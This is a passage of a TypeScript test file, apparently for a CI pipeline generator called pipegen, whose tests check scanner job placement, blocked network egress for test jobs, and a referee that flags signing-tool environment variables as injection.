    const lic = a.merge.licences as Job;
    expect(lic.steps.some((s) => s.id?.startsWith('pipegen-npm-ci-') === true)).toBe(false);
    expect(lic.steps.some((s) => /trivy/.test(s.name) && /--scanners/.test(String(s.run)))).toBe(true);
    const unit = a.merge['unit-tests--app'] as Job;
    const ci = unit.steps.find((s) => s.id?.startsWith('pipegen-npm-ci-') === true);
    expect(ci?.run).toMatch(/npm" ci --ignore-scripts|ci --ignore-scripts/);
    // putting that install in the licences job is refused by the job rules (repo code beside the fingerprint key)
    expect(() => dedupeJobSteps([...lic.steps.slice(0, 2), ci as never, ...lic.steps.slice(2)], { id: 'licences', scans: new Map([[lic.steps.find((s) => s.id?.startsWith('tool-run-'))?.id as string, { tool: 'trivy-licence', format: 'sarif' as const }]]) })).toThrow(/fingerprint key/);
    // the gate is told which lockfile kinds the licence scan reads (npm lockfile v3: read)
    expect(JSON.parse((a.merge.gate as Job).steps.find((s) => s.with?.mode === 'gate')?.with?.['licence-lockfiles'] as string)).toEqual([{ service: 'app', lockfiles: [{ kind: 'npm', read: true }] }]);
    // a lockfile trivy can not read licences from (npm lockfile v1) is reported to the gate as not read (the gate shows "not covered")
    const v1 = assemble(planned(profileOf([node({ npmLockfileVersion: 1 })])));
    expect(JSON.parse((v1.merge.gate as Job).steps.find((s) => s.with?.mode === 'gate')?.with?.['licence-lockfiles'] as string)).toEqual([{ service: 'app', lockfiles: [{ kind: 'npm', read: false }] }]);
    // base-scan runs trivy-licence on the base commit, always (no baseline condition)
    const base = a.merge['base-scan'] as Job;
    const licBase = base.steps.filter((s) => s.id?.endsWith(sha16Of(`${RESULT_ARTIFACT_PREFIX}base-licences`)) === true || s.with?.name === `${RESULT_ARTIFACT_PREFIX}base-licences`);
    expect(licBase.length).toBeGreaterThanOrEqual(3);
    for (const s of licBase) expect([undefined, 'always()']).toContain(s.if);
    expect(shown(await judge(files(a), a.draft))).toBe('');
  });

  it('assemble: no osv job for a service without a lockfile', async () => {
    const x = planned(profileOf([node({ packageManager: undefined, npmLockfileVersion: undefined })]));
    expect(x.draft.steps.some((s) => s.tool.id === 'osv-scanner')).toBe(true);
    const a = assemble(x);
    expect(a.merge['deps--app']).toBeUndefined();
    expect(a.push['deps--app']).toBeUndefined();
    expect(JSON.stringify(allJobs(a))).not.toMatch(/osv-scanner/);
    expect(a.draft.steps.some((s) => s.tool.id === 'osv-scanner')).toBe(false);
    expect(a.notes.join('\n')).toMatch(/"app" has no lockfile, so osv-scanner has nothing to read/);
    expect(shown(await judge(files(a), a.draft))).toBe('');
    // with a lockfile, the job is there
    expect(assemble(planned()).merge['deps--app']).toBeDefined();
  });

  it('assemble: pypi-publish and api-dast not rendered in v0.2, each with a note', () => {
    // a runnable node service with an API spec (api-dast) and a published Python package (PyPI publishing)
    const web = node({ name: 'web', path: '.', dockerfile: 'Dockerfile', port: 3000, quality: { ...emptyServiceQuality(), apiSpec: { kind: 'file', path: 'openapi.yaml' } } });
    const lib: Service = { ...node({ name: 'lib', path: 'lib', language: 'python', packageManager: 'pip', scripts: [], npmLockfileVersion: undefined }), publishedPackage: true };
    const prof = profileOf([web, lib]);
    const needs: Need[] = [
      ...floorNeeds(profileOf([web]), CAPS).filter((n) => n.layer !== 'deploy'),
      { id: 'publishing', layer: 'deploy', category: 'publishing', service: 'lib', why: 't', blocking: true, floor: false },
    ];
    const x = planned(prof, { needs });
    expect(x.draft.steps.some((s) => s.tool.id === 'pypi-publish')).toBe(true);
    expect(needs.some((n) => n.id === 'api-dast')).toBe(true);
    const a = assemble(x);
    const text = JSON.stringify(allJobs(a));
    expect(text).not.toMatch(/schemathesis|pypa\/gh-action-pypi-publish/);
    expect(a.notes).toContain(NOT_RENDERED_V02['api-dast']);
    expect(a.notes).toContain(PYPI_PUBLISH_NOTE);
    expect(a.draft.needs.some((n) => n.id === 'api-dast' || n.id === 'publishing')).toBe(false);
    // DAST of the running app is no limit (G4-R1): it runs in its two jobs (test/jobs-dast.test.ts)
    expect(NOT_RENDERED_V02.dast).toBeUndefined();
    expect(a.merge['dast-run--web']).toBeDefined();
    expect(a.merge['dast--web']).toBeDefined();
  });

  it('assemble: starter tests render in the isolated job; isolatedTestJob stays false', () => {
    expect(ISOLATED_TEST_JOB).toBe(false);
    const { id, job } = starterTestJob(node(), { reviewed: REVIEWED, platform: p });
    expect(id).toBe('starter-tests--app');
    // no secret, a read-only token, egress blocked (block mode, no Docker range), the checkout keeps no credentials
    expect(job.permissions).toEqual({ contents: 'read' });
    expect(JSON.stringify(job)).not.toMatch(new RegExp(`${SEC}\\.|github\\.token|id-token`));
    expect(job.steps[0]?.uses).toMatch(/^bullfrogsec\/bullfrog@/);
    expect(job.steps[0]?.with?.['egress-policy']).toBe('block');
    expect(job.steps[0]?.with?.['allowed-ips']).toBeUndefined();
    expect(job.steps.find((s) => s.uses?.startsWith('actions/checkout@') === true)?.with?.['persist-credentials']).toBe('false');
    // the tests run in a container with no network; nothing is uploaded or handed to a later job
    expect(job.steps.map((s) => s.run ?? '').join('\n')).toContain('--network none');
    expect(job.steps.some((s) => s.uses?.startsWith('actions/upload-artifact@') === true)).toBe(false);
    expect(job.outputs).toBeUndefined();
    expect(job['cache-mode']).toBe('none');
    // while the switch is off, no assembled pipeline holds the job, and a draft with starter tests is refused
    const a = assemble(planned());
    expect(Object.keys(a.merge).some((k) => k.startsWith('starter-tests'))).toBe(false);
    const withTests = planned(profileOf(), { over: { created: [{ path: 'test/app.pipegen.test.ts', content: 'x', part: 'tests', reason: 't', repo: 'app' }] } });
    expect(() => assemble(withTests)).toThrow(/switched off.*D7-R7/);
    // and nothing in this module passes the switch to the creators, the referee or the guard
    expect(readFileSync(new URL('../src/layers/jobs.ts', import.meta.url), 'utf8')).not.toMatch(/isolatedTestJob\s*:\s*true/);
  });

  it('assemble: assembled proof workflows pass checkProofWorkflows', () => {
    const a = assemble(planned(profileOf([node({ dockerfile: 'Dockerfile', port: 3000 })]), { over: { skipped: [{ part: 'deploy', reason: 't' }] } }), PROOF_SIGNING_MODE);
    const proof = [wf(a.merge, '.github/workflows/pipegen.yml', PR_ON), wf(a.push, '.github/workflows/pipegen-push.yml', { push: null })];
    expect(() => checkProofWorkflows(proof.map((f) => ({ path: f.path, content: f.content, kind: 'proof' as const })))).not.toThrow();
    // without its egress step first, a job breaks the proof rules
    const stripped = editJob(proof[0] as CreatedFile, 'sast--app', (j) => { (j.steps as Obj[]).shift(); });
    expect(() => checkProofWorkflows([{ path: stripped.path, content: stripped.content, kind: 'proof' }])).toThrow(/egress/);
  });
});

describe('G4 carries', () => {
  it('assemble: a test job of a service with dependencies starts them with pipegen\'s compose file first', async () => {
    const dep = { kind: 'postgres' as const, name: 'postgres', evidence: 'x', envVars: ['DATABASE_URL'] };
    const prof = profileOf([node({ dockerfile: 'Dockerfile', port: 3000, scripts: ['test', 'lint', 'start'], dependsOn: [dep] })]);
    const text = composeText(prof, loadBaseImages()) as string;
    expect(typeof text).toBe('string');
    const compose: CreatedFile = { path: 'docker-compose.pipegen.yml', content: text, part: 'compose', reason: 't', repo: 'app' };
    const a = assemble(planned(prof, { over: { created: [compose], skipped: [{ part: 'deploy', reason: 't' }] } }));
    const unit = a.merge['unit-tests--app'] as Job;
    const names = unit.steps.map((s) => s.id ?? s.uses?.split('@')[0] ?? '');
    const rt = names.findIndex((n) => n.startsWith('runtime-env-'));
    const up = names.findIndex((n) => n.startsWith('repocode-') && String(unit.steps[names.indexOf(n)]?.run).includes('docker compose'));
    const ci = names.findIndex((n) => n.startsWith('pipegen-npm-ci-'));
    expect(rt).toBeGreaterThan(0);
    expect(up).toBe(rt + 1);
    expect(ci).toBeGreaterThan(up);
    // the compose pulls (Docker Hub) and the containers' network (the Docker range) are open for this job only
    expect(domainsOf(unit)).toContain('registry-1.docker.io');
    expect(unit.steps[0]?.with?.['allowed-ips']).toBe('172.16.0.0/12');
    expect((a.merge['sast--app'] as Job).steps[0]?.with?.['allowed-ips']).toBeUndefined();
    // a findings job never starts it (repo code beside the fingerprint key)
    expect(JSON.stringify(a.merge['sast--app'])).not.toMatch(/docker compose/);
    expect(shown(await judge([...files(a), compose], a.draft))).toBe('');
    // a compose file pipegen does not compute is not started (a note)
    const other = assemble(planned(prof, { over: { created: [{ ...compose, content: `${text}# x\n` }], skipped: [{ part: 'deploy', reason: 't' }] } }));
    expect(JSON.stringify(other.merge)).not.toMatch(/docker compose/);
    expect(other.notes.join('\n')).toMatch(/not the file pipegen computes/);
  });


  it('referee: COSIGN_, SIGSTORE_ and TUF_ env names refused in a job that holds a cosign step', async () => {
    const pub = planned(profileOf([node({ dockerfile: 'Dockerfile', port: 3000 })]), {
      caps: { ...CAPS, keylessSigningAllowed: true }, over: { signing: { mode: 'keyless', images: [{ service: 'app', repo: 'ghcr.io/o/r-app' }] } },
    });
    const a = assemble(pub, 'keyless');
    const sign = { ...(a.sign as Obj), if: "github.event_name == 'push'", needs: ['gate'] };
    const on = { push: { branches: ['main'] }, pull_request: null };
    const base = wf({ ...a.merge, sign }, '.github/workflows/pipegen.yml', on);
    // the deploy layer's own jobs (image-publish, sbom, verify) and its egress need are G7's: their referee issues are not this test's
    const deployFree = (r: RefereeReport) => r.issues.filter((i) => !/"sbom"|"deploy-verify"|"signing"|"egress"|image-publish/.test(i.message));
    expect(deployFree(await judge([base], a.draft)).map((i) => `${i.check}: ${i.message}`)).toEqual([]);
    for (const name of ['COSIGN_EXPERIMENTAL', 'SIGSTORE_REKOR_URL', 'TUF_ROOT', 'cosign_repository']) {
      const atJob = editJob(base, 'sign', (j) => { j.env = { [name]: '1' }; });
      expect((await judge([atJob], a.draft)).issues.some((i) => i.check === 'injection' && i.message.includes(name)), `job ${name}`).toBe(true);
      const doc = parseDocument(base.content);
      doc.set('env', doc.createNode({ [name]: '1' }));
      expect((await judge([{ ...base, content: doc.toString({ lineWidth: 0 }) }], a.draft)).issues.some((i) => i.check === 'injection' && i.message.includes(name)), `workflow ${name}`).toBe(true);
    }
    // a job without a cosign step is not held to it (an app variable of that name elsewhere is the app's own)
    const plain = editJob(base, 'lint--app', (j) => { j.env = { COSIGN_X: '1' }; });
    expect((await judge([plain], a.draft)).issues.some((i) => i.message.includes('COSIGN_X'))).toBe(false);
  });
});
